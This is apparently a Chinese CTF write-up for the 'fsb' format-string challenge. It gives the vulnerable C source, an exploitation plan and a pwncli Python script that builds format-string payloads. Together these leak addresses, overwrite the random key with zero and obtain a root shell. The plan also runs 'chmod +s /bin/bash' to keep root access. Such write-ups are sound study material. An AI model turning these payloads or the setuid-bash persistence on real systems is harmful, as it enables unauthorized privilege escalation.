# buuctf-pwnable_fsb



### 总结

直接用`scp`从远程主机下载二进制文件分析，你会发现远程主机执行的实际是`x64`文件而不是`x86`，并且开启了`PIE`防护。

<!-- more -->

### checksec

![image-20220405133254489](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220405133254489.png)

可以直接下载远程的`libc`和`ld`，然后`patchelf`。

### 漏洞点

附上远程主机上的源码：

```c
#include <stdio.h>
#include <alloca.h>
#include <fcntl.h>

unsigned long long key;
char buf[100];
char buf2[100];

int fsb(char** argv, char** envp){
        char* args[]={"/bin/sh", 0};
        int i;

        char*** pargv = &argv;
        char*** penvp = &envp;
        char** arg;
        char* c;
        for(arg=argv;*arg;arg++) for(c=*arg; *c;c++) *c='\0';
        for(arg=envp;*arg;arg++) for(c=*arg; *c;c++) *c='\0';
        *pargv=0;
        *penvp=0;

        for(i=0; i<4; i++){
                printf("Give me some format strings(%d)\n", i+1);
                read(0, buf, 100);
                printf(buf);
        }

        printf("Wait a sec...\n");
        sleep(3);

        printf("key : \n");
        read(0, buf2, 100);
        unsigned long long pw = strtoull(buf2, 0, 10);
        if(pw == key){
                printf("Congratz!\n");
                setuid(0);
                setgid(0);
                execve(args[0], args, 0);
                return 0;
        }

        printf("Incorrect key \n");
        return 0;
}

int main(int argc, char* argv[], char** envp){

        int fd = open("/dev/urandom", O_RDONLY);
        if( fd==-1 || read(fd, &key, 8) != 8 ){
                printf("Error, tell admin\n");
                return 0;
        }
        close(fd);

        alloca(0x12345 & key);

        fsb(argv, envp); // exploit this format string bug!
        return 0;
}

```

非栈上的格式化字符串漏洞利用，虽然一开始栈随机降低了，但是可以根据地址计算出偏移。

### 利用思路

- 首先利用格式化字符串漏洞泄露出有用的栈地址和程序加载地址，计算出基地址
- 利用`rbp`跳板，在栈上布置`key`的地址
- 将`key`的内容写为`0`
- 获取`root shell`
- 执行`chmod +s /bin/bash`，避免掉线



![image-20220405134548556](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220405134548556.png)

### EXP

写了个脚本手动输入一下然后交互：

```python
#!/usr/bin/python3
# -*- encoding: utf-8 -*-
# author: roderick

from pwncli import *

# %11$p,%14$p,%18$p,###

log_ex("please input: %11$p,%14$p,%18$p,###")

m = input("Gie me the input: ")

stack1, code1, stack2, *_ = m.split(",")
stack1 = int16_ex(stack1)
code1 = int16_ex(code1)
stack2 = int16_ex(stack2)

codebase = code1 - 0xcb8
log_code_base_addr(codebase)
log_address("stack1", stack1)
log_address("stack2", stack2)

offset = 7 + (stack2 - stack1) // 8
log_ex(f"offset: {offset}")
key_addr = codebase + 0x202040

log_address("key addr", key_addr)

if  key_addr & 0xffffffff >= 0x7ffffffff:
    errlog_ex_highlight("try again!")

first_payload = f"%{key_addr & 0xffffffff}c%18$n".ljust(0x18, "X")
second_payload = f"%{offset}$ln".ljust(0x18, "X")

log_ex(f"The first payload: {first_payload}")
log_ex(f"The second payload: {second_payload}")

```

![image-20220405133923580](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220405133923580.png)

等待一会儿输入第二段`payload`，然后输入`key`为`0`：

成功的一次：

![image-20220405135126924](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220405135126924.png)

### 引用与参考

1、[My Blog](https://roderickchan.github.io)

2、[Ctf Wiki](https://ctf-wiki.org/)

3、[pwncli](https://github.com/RoderickChan/pwncli)

---

> 作者: [roderick](https://roderickchan.github.io)  
> URL: https://roderickchan.github.io/zh-cn/2022-04-05-buuctf-pwnable-fsb/  

